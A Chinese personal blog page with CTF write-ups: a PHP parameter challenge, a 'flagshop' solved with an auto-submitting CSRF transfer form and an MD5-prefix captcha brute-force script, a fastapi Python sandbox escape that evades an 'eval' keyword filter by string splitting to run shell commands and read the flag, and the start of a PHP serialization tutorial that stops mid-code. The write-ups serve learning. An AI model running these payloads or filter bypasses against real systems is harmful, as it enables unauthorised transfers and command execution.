-<h2 id="三、刘壮的黑页"><a href="#三、刘壮的黑页" class="headerlink" title="三、刘壮的黑页"></a>三、刘壮的黑页</h2><p>打开题目<br><img src="https://img-blog.csdnimg.cn/20201030235907276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="题目"><br>然后往下翻，发现php代码<br><img src="https://img-blog.csdnimg.cn/20201030235941162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="php源码"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="keyword">if</span> ($username === <span class="string">'admin'</span> &amp;&amp; $passwd === <span class="string">'syclover'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>所以按照代码所说，get、post两个参数进去得到flag。<img src="https://img-blog.csdnimg.cn/20201031000113570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="得到flag"></p>
-<h2 id="四、welcome"><a href="#四、welcome" class="headerlink" title="四、welcome"></a>四、welcome</h2><p>打开题目<br><img src="https://img-blog.csdnimg.cn/20201031000228468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="题目"><br>发现一串空白。然后就随便get了一个东西，但是发现题目提示还有第二种方法，就post了一个。</p>
-<h2 id="五、flagshop"><a href="#五、flagshop" class="headerlink" title="五、flagshop"></a>五、flagshop</h2><p>听题目就是卖flag的了。打开注册进行登录。发现界面如下<br><img src="https://img-blog.csdnimg.cn/20201108193237662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="成功的截图"><br>钱包那里是成功之后的效果。<img src="https://img-blog.csdnimg.cn/2020110819334534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="商品类"><br>当时好奇点了个<strong>今晚去你家吃饭卡</strong>一下子就没钱了，让我本就不富裕的生活更加的雪上加霜。<br>回归正题，在转账界面可以进行转账，然后就试了一下给自己转账<img src="https://img-blog.csdnimg.cn/20201108193542236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="效果"><br>然后感觉就是在留言界面进行操作了。但是具体怎么操作不了解，后来请教了团队大佬，经过他的讲解之后了解了可操作的原理。<br>原理：<code>在报告界面有一个提交报告内容，在这里提交了内容后，后台会进行点击一次的操作，不过经过实验发现是只会点击一次</code>。也就是说，这个题目可以利用<code>CSRF</code>漏洞进行攻击，但是需要自己写一个页面让后台点击，接着会自动跳转到转账页面，让服务器以为是后台转账操作。<br>然后就是强烈介绍我的大表哥–<code>brupsuit</code>了。利用其自带功能，可以编写一个<code>csrf攻击html网页</code><br><img src="https://img-blog.csdnimg.cn/20201108195621730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="抓包"></p>
-<p>抓包页面是这样的，然后就<img src="https://img-blog.csdnimg.cn/20201108195651331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="csrf"><br><img src="https://img-blog.csdnimg.cn/20201108195711825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="页面源码"><br>然后把源码copy一下，在本地创建一个html文档。名字随意。源码如下：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://173.82.206.142:8005/transfer.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"target"</span> <span class="attr">value</span>=<span class="string">"qwasd"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"money"</span> <span class="attr">value</span>=<span class="string">"1000000000000000000000000000000000000000000000000000000"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"messages"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> <span class="attr">id</span>=<span class="string">"onclick_1"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">"onclick_1"</span>).click();</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>其中</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">     <span class="built_in">document</span>.getElementById(<span class="string">"onclick_1"</span>).click();</span><br><span class="line">   &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这一段代码用来实现页面进入后自动点击的操作。<br>然后由于是要后台点击你的链接，所以不能放在本地，有条件的哥哥姐姐们可以放在自己的服务器上面，小弟比较菜，就在博客里放了一个链接。也达到了同样的效果。<br>然后就是<img src="https://img-blog.csdnimg.cn/20201108200105832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="提交报告"><br>上面验证码初看一脸懵逼，再看两眼迷离的，所以就问了大佬之后知道了是MD5截断加密。大佬还慷慨的给了我一个脚本用来爆破的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env/python</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> tp</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">knownMd5 = <span class="string">'6fb05'</span>      <span class="comment">#已知的md5明文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(text).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findCode</span><span class="params">(code)</span>:</span></span><br><span class="line">    key = code.split(<span class="string">':'</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])</span><br><span class="line">    end = int(key[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> range(start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(code)[<span class="number">0</span>:<span class="number">5</span>] == knownMd5:</span><br><span class="line">            print(code)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">list=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):    <span class="comment">#这里的range(number)指爆破出多少结果停止</span></span><br><span class="line">    list.append(str(<span class="number">10000000</span>*i) + <span class="string">':'</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = tp()    <span class="comment">#使用多线程加快爆破速度</span></span><br><span class="line">pool.map(findCode, list)</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
-<p>然后最后加上自己的链接以及爆破出来的验证码，标题随便写，提交成功就等着转账到账了。<br><img src="https://img-blog.csdnimg.cn/20201108200457570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="效果"><br>之后就是到账，购买flag。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/11/18/ctf-python%E9%A2%98%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/18/ctf-python%E9%A2%98%E8%AE%B0/" class="post-title-link" itemprop="url">ctf-python题记</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-11-18 23:07:04 / Modified: 23:07:01" itemprop="dateCreated datePublished" datetime="2020-11-18T23:07:04+08:00">2020-11-18</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>@<a href="python">TOC</a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上次做ctfshow的1024挑战杯，发现web题都没见过的题型，因此没有全部记录下来，这次特意对其中一个题进行一个较为详细的记录</p>
-<h1 id="fastapi"><a href="#fastapi" class="headerlink" title="fastapi"></a>fastapi</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
-<p>fastapi是高性能的web框架。他的主要特点是：</p>
-<ul>
-<li>快速编码</li>
-<li>减少人为bug</li>
-<li>直观</li>
-<li>简易</li>
-<li>具有交互式文档</li>
-<li>基于API的开放标准（并与之完全兼容）：OpenAPI（以前称为Swagger）和JSON Schema。</li>
-</ul>
-</blockquote>
-<h2 id="fastapi安装使用"><a href="#fastapi安装使用" class="headerlink" title="fastapi安装使用"></a>fastapi安装使用</h2><p><a href="https://blog.csdn.net/weixin_40156487/article/details/101446937" target="_blank" rel="noopener">大师傅博客</a><br>具体的就不多进行赘述了，师傅博客里写的挺好的，这次就是简单的了解半只脚跨进来，以后遇到了难处再进行补充说明。</p>
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>打开题目<br><img src="https://img-blog.csdnimg.cn/20201115201404897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="打开题目"><br>发现提示<code>fastapi</code>，然后在这个的官网上找到了，<code>对于fastapi，网页会存在自述文档文件 /docs</code>，打开之后发现<br><img src="https://img-blog.csdnimg.cn/20201115201852647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="打开docs之后"><br>发现了一个端口，需要<code>post</code>参数<code>q</code>来执行，所以看大佬的博客尝试post了一个python有返回值的函数</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"res"</span>:<span class="string">"yoyo"</span>,<span class="string">"err"</span>:flase&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2020111520205745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="返回"><br>所以在这里可以尝试进行<code>ssti</code>，具体思路，在上一篇已经说过了一些python里的方法，所以思路就是进行逐个尝试，最后进行搜索，读取指定文件的内容来获取flag<br>对于这些方法</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
-<p>所以首先构造payload：<code>q=str(&#39;&#39;.__class__)</code>得到<br><img src="https://img-blog.csdnimg.cn/20201115202354972.png#pic_center" alt="第一次"><br>接着依次构造</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>])</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"&lt;class 'object'&gt;"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>])</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"&lt;class 'warnings.catch_warnings'&gt;"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>].__init__)</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"&lt;function catch_warnings.__init__ at 0x7fad291ef5f0&gt;"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>])//注意这里存在了一个过滤，过滤掉了eval，所以采用python里的字符拼接进行绕过</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"&lt;built-in function eval&gt;"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("os").po'</span>+<span class="string">'pen("whoami").read()'</span>))</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"root\n"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">//到了这里，基本上就做出来了，可以进行查找等操作了</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("os").po'</span>+<span class="string">'pen("ls").read()'</span>))//这里同上，进行了过滤，采用字符拼接进行绕过</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"main.py\nstart.sh\n"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("os").po'</span>+<span class="string">'pen("grep flag main.py").read()'</span>))</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"        hint = \"flag is in /mnt/f1a9,try to read it\"\n"</span>,<span class="string">"err"</span>:false&#125;</span><br><span class="line">q=str(<span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("os").po'</span>+<span class="string">'pen("cat /mnt/f1a9").read()'</span>))</span><br><span class="line">&gt;&gt;&#123;<span class="string">"res"</span>:<span class="string">"flag&#123;787c8b2b-da0d-457e-b7a5-04f1acfebceb&#125;\n"</span>,<span class="string">"err"</span>:false&#125;</span><br></pre></td></tr></table></figure>
-<p>得到flag。</p>
-<h2 id="做题过程的payload部分解析"><a href="#做题过程的payload部分解析" class="headerlink" title="做题过程的payload部分解析"></a>做题过程的payload部分解析</h2><p>对于上面的一串子payload，有的已经说明过了，对于一些没说明过的，在这里进行一下简单的说明，防止以后自己忘了。<code>【手动滑稽】</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(globals()) <span class="comment"># globals 函数返回一个全局变量的字典，包括所有导入的变量。</span></span><br><span class="line">os.popen()//用于从一个命令打开一个管道。在我理解就是，执行一些系统命令，比如ls cat 等</span><br><span class="line">grep //对于这个就不用多说了吧，Linux命令，用于查找某些符合条件的字符串</span><br></pre></td></tr></table></figure>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这一篇就是一点简单的记录，没办法与那些大师傅们的博客比，就是为了自己现在学习，怕忘记了。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/11/18/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/18/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">PHP序列化及反序列化绕过</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-11-18 23:06:26 / Modified: 23:05:27" itemprop="dateCreated datePublished" datetime="2020-11-18T23:06:26+08:00">2020-11-18</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>@<a href="序列化和反序列化及绕过">TOC</a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本菜鸡本着菜死人不偿命的觉悟，接着迈向了ctf的世界。<br><strong>废话不多说，今天来谈一下PHP的序列化和反序列化还有一些绕过姿势</strong></p>
-<h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>在PHP里面存在一个<code>serialize</code>方法来实现序列化功能。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Serializable &#123;</span><br><span class="line"><span class="comment">/* 方法 */</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> serialize ( ) : string</span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> unserialize ( string $serialized ) : mixed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在官方说明中提供了这个接口的摘要。<br>接下来用本地实验的例子来说明一下序列化结果的大致格式</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$init=<span class="number">12</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($init).<span class="string">'&lt;br /&gt;'</span>;<span class="comment">//序列化整形数据，得到格式为i:12;</span></span><br><span class="line">$string=<span class="string">'test'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($string).<span class="string">'&lt;br /&gt;'</span>;<span class="comment">//序列化字符串型数据，得到格式为s:4:"test";</span></span><br><span class="line">$boolean=<span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($boolean).<span class="string">'&lt;br /&gt;'</span>;<span class="comment">//序列化布尔类型数据，得到格式为b:0;</span></span><br><span class="line">$array = <span class="keyword">array</span>(<span class="string">'0'</span> =&gt;<span class="string">'array'</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($array).<span class="string">'&lt;br /&gt;'</span>;<span class="comment">//序列化数组类型数据，得到格式为a:1:&#123;i:0;s:5:"array";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20201117202304956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="运行结果"><br>所以，经过试验可以得出：<br><code>i</code>即<code>integer</code>代表的是<code>整型的数据</code>，其<code>数据的范围</code>是<code>-2147483648~2147483647</code>，而其后面跟的12就是这个变量的值；<br><code>s</code>即<code>string</code>代表的是<code>字符串类型</code>的数据，后面跟的4为变量的字符个数，之后跟的是变量的值；<br><code>b</code>即<code>bool</code>代表的是<code>布尔类型</code>的数据，而布尔类型的数据只有<code>false</code>和<code>true</code>两种，返回时只会返回<code>0</code>和<code>1</code>；<br><code>a</code>即<code>array</code>代表的是数组类型的数据，可以看到有一个花括号，前面半部分是索引值，代表的是数组索引是从0开始，后面是当前索引位置的数据的类型和值。<br>关于其他的，就不在这里进行总结，总结几个比较常见的。<br>当然还有就是PHP语言特性，可以把<code>整个方法或者整个类给序列化</code>，这时的格式就是<code>O</code>开头了。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*$init=12;</span></span><br><span class="line"><span class="comment">echo serialize($init).'&lt;br /&gt;';</span></span><br><span class="line"><span class="comment">$string='test';</span></span><br><span class="line"><span class="comment">echo serialize($string).'&lt;br /&gt;';</span></span><br><span class="line"><span class="comment">$boolean=false;</span></span><br><span class="line"><span class="comment">echo serialize($boolean).'&lt;br /&gt;';</span></span><br><span class="line"><span class="comment">$array = array('0' =&gt;'array');</span></span><br><span class="line"><span class="comment">echo serialize($array).'&lt;br /&gt;';*/</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $username;</span><br><span class="line">	<span class="keyword">public</span> $password;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment"># code...</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;username=$username;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 